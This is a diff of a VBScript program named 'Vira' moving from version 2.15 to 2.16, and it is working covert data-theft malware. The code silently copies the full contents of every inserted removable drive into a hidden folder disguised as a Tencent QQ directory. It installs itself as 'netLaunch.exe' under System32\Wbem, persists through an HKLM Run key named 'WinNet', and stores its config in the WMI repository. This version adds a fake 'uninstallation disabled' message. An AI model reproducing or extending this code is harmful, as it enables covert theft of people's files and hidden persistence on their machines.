@@ -1,28 +1,26 @@
-'Version 2.15 Ultimate
+'Version 2.16 Ultimate
 Option Explicit
 On Error Resume Next
-Const ViraVersion = "2.15"
 
-Dim FlagFileNum, FlagFile, MaxCapacityGB, Destination
-Dim Container, IsCopied(23)
+'************
+' Constants
+'************
+Const ViraVersion = "2.16"
+Const RETURN_SUCCESS = 0
+Const RETURN_FAILURE = 1
+
+Dim FlagFileNum, FlagFile, MaxCapacityGB, Destination, ConfigFile
+Dim HasAdmin, Container, IsCopied(23)
 Dim Shell, Fso, Fin, Fout
 Set Shell = CreateObject("WScript.Shell")
 Set Fso = CreateObject("Scripting.FileSystemObject")
 
-'********************
-' Customize Section
-'********************
+' The only thing left customizable...
+ConfigFile = "C:\Windows\System32\wbem\Repository\CONFIG.CTI"
 
-FlagFileNum = 2
-FlagFile = Array("Setup.exe", "bootmgr")
-
-MaxCapacityGB = 32
-Destination = "D:\Program Files\Tencent\QQMaster\" 'Must end with a backslash [\]
-
-'***************************
-' End of Customize Section
-'***************************
-
+'***************
+' Main Program
+'***************
 If Wsh.Arguments.Count = 0 Then
   ProcessMain
 Else
@@ -57,6 +55,9 @@ Else
   Next
 End If
 
+'****************
+' Main Function
+'****************
 Public Sub ProcessMain
   ViraInitialize
   Do
@@ -68,12 +69,12 @@ End Sub
 '*************************
 ' Vira Process Functions
 '*************************
-
 Public Sub ViraInitialize()
-  Dim i
+  If ReadConfig() <> 0 Then Wsh.Quit 1
   Shell.Run "CMD.EXE /C MKDIR """ & Destination & """", 0, True
   Set Container = Fso.GetFolder(Destination)
   Container.Attributes = 7
+  Dim i
   For i = 0 To 22
     IsCopied(i) = False
   Next
@@ -122,34 +123,77 @@ Public Function ProcessDrive(DriveLetter)
 End Function
 
 Public Sub CopyDrive(DriveLetter)
-  Dim Fout, UDrive, Target
+  Dim UDrive, File, TargetF, Target, TimeA, TimeB
   Set UDrive = Fso.GetDrive(DriveLetter)
-  'Generate Disk Info
   Target = Destination & Hex(UDrive.SerialNumber) & "\"
-  If Not Fso.FolderExists(Target) Then Fso.CreateFolder Target
-  Set Fout = Fso.OpenTextFile(Target & "Vira.ini", 2, True, 0)
-  Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
-  Fout.WriteLine "[Drive]"
-  Fout.WriteLine "SerialNumber=" & Hex(UDrive.SerialNumber)
-  Fout.WriteLine "VolumeName=" & UDrive.VolumeName
-  Fout.WriteLine "FileSystem=" & UDrive.FileSystem
-  Fout.WriteLine "TotalSpace=" & UDrive.TotalSize
-  Fout.WriteLine "FreeSpace=" & UDrive.FreeSpace
-  Fout.Close
-  Set Fout = Nothing
   Set UDrive = Nothing
+  If Not Fso.FolderExists(Target) Then Fso.CreateFolder Target
+  WriteDriveInfo DriveLetter, Target & "Vira.ini"
   
+  TimeA = Timer()
   Fso.CopyFile DriveLetter & ":\*", Target, True
   Fso.CopyFolder DriveLetter & ":\*", Target, True
+  TimeB = Timer()
+  If TimeB < TimeA Then TimeB = TimeB + 86400
+  Set File = Fso.OpenTextFile(Target & "Vira.ini", 8)
+  Set TargetF = Fso.GetFolder(Target)
+  File.WriteLine "AverageSpeed=" & ConvertSize(TargetF.Size/(TimeB-TimeA)) & "/s"
+  File.Close
 End Sub
 
-'***********************
+Public Sub HarvestDrive(DriveLetter)
+  ' Unfinished Yet
+End Sub
+
+Public Sub WriteDriveInfo(DriveLetter, FileName)
+  Dim Fout, DriveInfo
+  Set Fout = Fso.OpenTextFile(FileName, 2, True, 0)
+  Set DriveInfo = Fso.GetDrive(DriveLetter)
+  If DriveInfo Is Nothing Then Exit Sub
+  Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
+  Fout.WriteLine "OperationTime=" & Now()
+  Fout.WriteLine "[DriveInfo]"
+  Fout.WriteLine "SerialNumber=" & Hex(DriveInfo.SerialNumber)
+  Fout.WriteLine "VolumeName=" & DriveInfo.VolumeName
+  Fout.WriteLine "FileSystem=" & DriveInfo.FileSystem
+  Fout.WriteLine "TotalSize=" & DriveInfo.TotalSize & " (" & ConvertSize(DriveInfo.TotalSize) & ")"
+  Fout.WriteLine "FreeSpace=" & DriveInfo.FreeSpace & " (" & ConvertSize(DriveInfo.FreeSpace) & ")"
+  Fout.Close
+End Sub
+
+'******************
+' Shell Functions
+'******************
+
 Public Sub InstallLocal()
   If Not AdminTest() Then
     MsgBox "Installation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
     Wsh.Quit 1
   End If
-  Dim TempString
+  Dim TempString, i, Input
+  If MsgBox("Customize Vira?", 324, "Vira " & ViraVersion) = 6 Then
+    MsgBox "Please follow the instructions and enter information PROPERLY." & vbCrLf & _
+           "Any errorneous data may lead to unpredictable behaviour of Vira.", 64, "Vira " & ViraVersion
+    FlagFileNum = CInt(InputBox("How many flag files are there to recognize ""protected drive""?", _
+                                "Vira " & ViraVersion, 0))
+    If FlagFileNum > 0 Then TempString = InputBox("Enter flag file 1", "Vira " & ViraVersion, "setup.exe")
+    For i = 2 to FlagFileNum
+      TempString = TempString & "|" & InputBox("Enter flag file " & i, "Vira " & ViraVersion, "setup.exe")
+    Next
+    FlagFile = TempString
+    
+    MaxCapacityGB = CInt(InputBox("How much disk space(in GB) is allocated for Vira?", _
+                                  "Vira " & ViraVersion, "32"))
+    Destination = InputBox("Where can Vira hide the files ""harvested""?" & vbCrLf & _
+                           "Please end with a backslash [\]", _
+                           "Vira " & ViraVersion, "D:\Program Files\Tencent\QQMaster\")
+  Else
+    FlagFile = "setup.exe|bootmgr"
+    MaxCapacityGB = 32
+    Destination = "D:\Program Files\Tencent\QQMaster"
+  End If
+  WriteConfig FlagFile, MaxCapacityGB, Destination
+  
   TempString = Fso.GetParentFolderName(Wsh.ScriptFullName) & "\vtemp.vbe"
   EndProcess "netLaunch.exe"
   If Fso.FileExists("screnc.exe") Then
@@ -162,7 +206,7 @@ Public Sub InstallLocal()
   Fso.CopyFile Wsh.FullName, "C:\Windows\system32\Wbem\netLaunch.exe", True
   
   TempString = "C:\Windows\system32\Wbem\netLaunch.exe C:\Windows\system32\Wbem\netLaunch.vbe"
-  Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet", _
+  Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet", _
           TempString, "REG_SZ"
   Shell.Run TempString, 0, False
   MsgBox "Installation Complete!", 64, "Vira " & ViraVersion
@@ -170,6 +214,10 @@ Public Sub InstallLocal()
 End Sub
 
 Public Sub UninstLocal()
+  MsgBox "Local uninstallation is disabled for security reasons.", 64, "Vira " & ViraVersion
+End Sub
+
+Public Sub GenuineUninstLocal()
   If Not AdminTest() Then
     MsgBox "Uninstallation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
     Wsh.Quit 1
@@ -177,12 +225,19 @@ Public Sub UninstLocal()
   EndProcess "netLaunch.exe"
   Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.exe", True
   Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.vbe", True
-  Shell.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet"
+  Shell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet"
   MsgBox "Uninstallation Complete!", 64, "Vira " & ViraVersion
   Wsh.Quit 0
 End Sub
 
 Public Function AdminTest()
+  If HasAdmin = 1 Then
+    AdminTest = True
+    Exit Function
+  ElseIf HasAdmin = 2 Then
+    AdminTest = False
+    Exit Function
+  End If
   On Error Resume Next
   Dim TestDir
   TestDir = "C:\Windows\AdminTest\"
@@ -191,18 +246,97 @@ Public Function AdminTest()
   AdminTest = Fso.FolderExists(TestDir)
   If AdminTest Then
     Fso.DeleteFolder TestDir
+    HasAdmin = 1
+  Else
+    HasAdmin = 2
   End If
 End Function
 
 Public Sub EndProcess(ProcessName)
-  On Error Resume Next
   Shell.Run "TASKKILL.EXE /F /FI ""IMAGENAME eq " & ProcessName & """", 0, True
-  Exit Sub
-  Dim Wmi, Procs, Proc
-  Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
-  Set Procs = Wmi.ExecQuery("select * from win32_process where name='" & ProcessName & "'")
-  For Each Proc In Procs 
-    Proc.Terminate 
-  Next
 End Sub
 
+Public Function ReadConfig()
+  On Error Resume Next
+  If Not Fso.FileExists(ConfigFile) Then
+    If WriteConfig(Array("Setup.exe", "bootmgr"), 32, "D:\Program Files\Tencent\QQMaster\") <> 0 Then
+      ReadConfig = 1
+      Exit Function
+    End If
+  End If
+  Dim File
+  Set File = Fso.OpenTextFile(ConfigFile, 1)
+  str = File.ReadLine()
+  If str <> "VR2XF" Then
+    File.Close
+    If WriteConfig(Array("Setup.exe", "bootmgr"), 32, "D:\Program Files\Tencent\QQMaster\") <> 0 Then
+      ReadConfig = 1
+      Exit Function
+    End If
+    ReadConfig = ReadConfig()
+    Exit Function
+  End If
+  FlagFile = Split(File.ReadLine(), "|")
+  FlagFileNum = UBound(FlagFile)
+  MaxCapacityGB = CDbl(File.ReadLine())
+  Destination = File.ReadLine()
+  If File.AtEndOfStream Then
+    File.Close
+    ReadConfig = 1
+    Exit Function
+  End If
+  File.Close
+  ReadConfig = 0
+End Function
+
+Public Function WriteConfig(FlagFiles, Capacity, Storage)
+  If Not AdminTest() Or Not IsArray(FlagFiles) Then
+    WriteConfig = 1
+    Exit Function
+  End If
+  Dim File, FileNames, FlagFileNum, i
+  FlagFileNum = UBound(FlagFiles)
+  If FlagFileNum = 0 Then
+    WriteConfig = 1
+    Exit Function
+  End If
+  FileNames = FlagFiles(0)
+  If FlagFileNum > 1 Then
+    For i = 1 To FlagFileNum - 1
+      FileNames = FileNames & "|" & FlagFiles(i)
+    Next
+  End If
+  Set File = Fso.OpenTextFile(ConfigFile, 2, True)
+  File.WriteLine "VR2XF" 'File Valiation
+  File.WriteLine FileNames
+  File.WriteLine CDbl(Capacity)
+  File.WriteLine Storage
+  File.WriteLine "XEOF"
+  File.Close
+  WriteConfig = 0
+End Function
+
+Public Function ConvertSize(ByVal dSize)
+  Dim SizeSuffix, PowerLevel
+  SizeSuffix = Array("B", "KB", "MB", "GB", "TB")
+  For PowerLevel = 0 To 4
+    If dSize >= 1024 Then
+      dSize = dSize / 1024
+    Else
+      Exit For
+    End If
+  Next
+  ConvertSize = FormatNumber(dSize, 2, True) & SizeSuffix(PowerLevel)
+End Function
+
+Public Sub Include(InclFile)
+  Dim File, InclContent 
+  Set File = Fso.OpenTextFile(InclFile) 
+  InclContent = File.ReadAll() 
+  File.Close
+  ExecuteGlobal InclContent
+End Sub 
+
+'*****************
+' End of Program
+'*****************
